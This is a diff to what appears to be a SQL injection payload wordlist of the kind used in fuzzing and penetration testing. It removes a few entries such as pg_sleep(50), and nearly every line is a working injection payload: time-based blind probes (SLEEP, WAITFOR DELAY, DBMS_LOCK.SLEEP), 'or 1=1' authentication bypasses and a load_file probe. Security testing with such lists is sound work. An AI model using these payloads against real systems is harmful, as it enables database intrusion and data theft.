@@ -71,9 +71,7 @@ WAITFOR DELAY '0:0:50';--"
 SLEEP(50)
 ' SLEEP(50)--
 ' SLEEP(50)
-pg_sleep(50)
 ' pg_sleep(50)
-PG_DELAY(50)
 and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--
 ' and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--
 DBMS_LOCK.SLEEP(50);
@@ -730,7 +728,6 @@ b'|'
 b"or sleep(__TIME__)='"
 b"or 1 --'"
 b'or 0=0 #"'
-b'having'
 b' or isNULL(1/0) /*'
 b'declare @s varchar (8000) select @s = 0x73656c ...'
 b'a\xc2\x80\xc2\x98 or 1=1 --'
@@ -1174,7 +1171,6 @@ fake@ema'or'il.nl'='il.nl
 '||'6
 (||6)
 %7C
-a'
 admin' or '
 ' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
 ' and 1 in (select var from temp)--
@@ -1863,7 +1859,6 @@ char%4039%41%2b%40SELECT
 ' or 1=1 or ''='
 ' or ''='
 x' or 1=1 or 'x'='y
-//*
 */*
 a' or 3=3--
 "a"" or 3=3--"
